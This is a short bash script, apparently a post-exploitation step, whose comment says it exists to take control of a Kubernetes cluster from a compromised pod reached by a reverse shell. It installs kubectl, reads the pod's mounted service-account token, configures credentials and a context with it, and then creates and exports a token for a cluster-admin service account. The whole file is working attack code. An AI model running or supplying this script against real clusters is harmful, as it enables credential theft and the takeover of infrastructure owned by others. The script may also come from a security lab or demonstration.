#!/bin/bash
# execute command to take control of kubernetes cluster

# install kubectl
if [ ! -f "/usr/local/bin/kubectl" ]; then
	apt update && apt -y install curl
	#Download and install kubectl into pod
	curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
	chmod +x ./kubectl
	mv ./kubectl /usr/local/bin/kubectl
fi


# create new user from reverse-shell and using kubectl with kubernetes token
kubectl config set-credentials my-user --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token)

# set context with this user
kubectl config set-context sa-context --user=my-user

# Create new cluster-admin-sa token
kubectl create token cluster-admin-sa --namespace default > /tmp/token
export TOKEN=$(cat /tmp/token)

